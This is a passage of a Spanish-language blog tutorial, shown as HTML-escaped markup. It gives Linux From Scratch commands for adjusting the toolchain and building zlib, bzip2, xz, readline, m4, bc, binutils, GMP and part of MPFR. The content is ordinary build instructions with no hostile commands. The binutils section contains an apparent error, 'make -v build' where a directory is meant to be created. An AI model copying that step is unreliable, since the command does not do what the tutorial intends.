&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/ld.so.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/ld.so.conf
/usr/local/lib
/opt/lib
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;
EOF

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/ld.so.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Add an include directory
include /etc/ld.so.conf.d/*.conf
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;
EOF
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /etc/ld.so.conf.d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zW.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;ajuste-de-la-toolchain&quot;&gt;Ajuste de la Toolchain&lt;/h5&gt;

&lt;p&gt;Ahora que se han instalado las bibliotecas de C finales, es hora de ajustar la cadena de herramientas para que se vincule cualquier programa recién compilado con estas bibliotecas nuevas.&lt;/p&gt;

&lt;p&gt;Ejecutamos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /tools/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ld,ld-old&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /tools/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-pc-linux-gnu&lt;/span&gt;/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ld,ld-old&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /tools/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ld-new,ld&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /tools/bin/ld /tools/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-pc-linux-gnu&lt;/span&gt;/bin/ld

gcc &lt;span class=&quot;nt&quot;&gt;-dumpspecs&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/tools@@g'&lt;/span&gt;                   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/\*startfile_prefix_spec:/{n;s@.*@/usr/lib/ @}'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/\*cpp:/{n;s@$@ -isystem /usr/include@}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;--print-libgcc-file-name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/specs

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'int main(){}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dummy.c
cc dummy.c &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wl&lt;/span&gt;,--verbose &amp;amp;&amp;gt; dummy.log
readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; a.out | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;': /lib'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si una vez aplicados estos comandos nos sale el siguiente output, es que todo está correcto:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349Ae.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien, ¿quieres quedarte tranquilo y saber si todo se ha hecho correctamente?, hagamos las siguientes comprobaciones.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/usr/lib.*/crt[1in].*succeeded'&lt;/span&gt; dummy.log
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-B1&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^ /usr/include'&lt;/span&gt; dummy.log
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SEARCH.*/usr/lib'&lt;/span&gt; dummy.log |sed &lt;span class=&quot;s1&quot;&gt;'s|; |\n|g'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/lib.*/libc.so.6 &quot;&lt;/span&gt; dummy.log
&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;found dummy.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si la ejecución de cada uno de estos comandos nos devuelve los siguientes resultados, es que todo está correcto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349Ev.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;El último comando ejecutado, es para limpiar los archivos de prueba:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; dummy.c a.out dummy.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como esta fase ha llevado su tiempo, lo mejor es hacer otra Snapshot:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349EP.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;zlib-en-lfs&quot;&gt;Zlib en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libz.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libz.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libz.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;bzip2-en-lfs&quot;&gt;Bzip2 en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../bzip2-1.0.8-install_docs-1.patch
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@\(ln -s -f \)$(PREFIX)/bin/@\1@'&lt;/span&gt; Makefile
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s@(PREFIX)/man@(PREFIX)/share/man@g&quot;&lt;/span&gt; Makefile
make &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; Makefile-libbz2_so
make clean

make
make &lt;span class=&quot;nv&quot;&gt;PREFIX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nb&quot;&gt;install

cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; bzip2-shared /bin/bzip2
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-av&lt;/span&gt; libbz2.so&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; ../../lib/libbz2.so.1.0 /usr/lib/libbz2.so
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bunzip2,bzcat,bzip2&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; bzip2 /bin/bunzip2
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; bzip2 /bin/bzcat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;xz-en-lfs&quot;&gt;Xz en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/xz-5.2.4

make
make check

make &lt;span class=&quot;nb&quot;&gt;install
mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;   /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;lzma,unlzma,lzcat,xz,unxz,xzcat&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/liblzma.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-svf&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/liblzma.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/liblzma.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;file-en-lfs&quot;&gt;File en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;readline-en-lfs&quot;&gt;Readline en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/MV.*old/d'&lt;/span&gt; Makefile.in
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/{OLDSUFF}/c:'&lt;/span&gt; support/shlib-install

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/readline-8.0

make &lt;span class=&quot;nv&quot;&gt;SHLIB_LIBS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-L/tools/lib -lncursesw&quot;&lt;/span&gt;
make &lt;span class=&quot;nv&quot;&gt;SHLIB_LIBS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-L/tools/lib -lncursesw&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install
mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/lib&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;readline,history&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; u+w /lib/lib&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;readline,history&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libreadline.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libreadline.so
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libhistory.so &lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libhistory.so

&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m644&lt;/span&gt; doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ps,pdf,html,dvi&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /usr/share/doc/readline-8.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;m4-en-lfs&quot;&gt;M4 en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/IO_ftrylockfile/IO_EOF_SEEN/'&lt;/span&gt; lib/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.c
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#define _IO_IN_BACKUP 0x100&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; lib/stdio-impl.h

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;bc-en-lfs&quot;&gt;Bc en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;PREFIX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gcc &lt;span class=&quot;nv&quot;&gt;CFLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-std=c99&quot;&lt;/span&gt; ./configure.sh &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O3&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;binutils-en-lfs&quot;&gt;Binutils en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, comenzaremos haciendo una pequeña verificación con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;expect &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;spawn ls&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si la ejecución de este comando devuelve el siguiente output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;spawn &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entonces podemos quedarnos tranquilos.&lt;/p&gt;

&lt;p&gt;Posteriormente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/@\tincremental_copy/d'&lt;/span&gt; gold/testsuite/Makefile.in
make &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

../configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-gold&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-ld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;default &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-plugins&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-shared&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-werror&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-64-bit-bfd&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-system-zlib&lt;/span&gt;

make &lt;span class=&quot;nv&quot;&gt;tooldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; check
make &lt;span class=&quot;nv&quot;&gt;tooldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gmp-en-lfs&quot;&gt;GMP en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-cxx&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/gmp-6.2.0

make
make html
make check 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;gmp-check-log
&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/# PASS:/{total+=$3} ; END{print total}'&lt;/span&gt; gmp-check-log &lt;span class=&quot;c&quot;&gt;# Verificamos que la ejecución de este comando devuelva un número mayor a 190&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install
&lt;/span&gt;make install-html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;mpfr-en-lfs&quot;&gt;MPFR en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-thread-safe&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
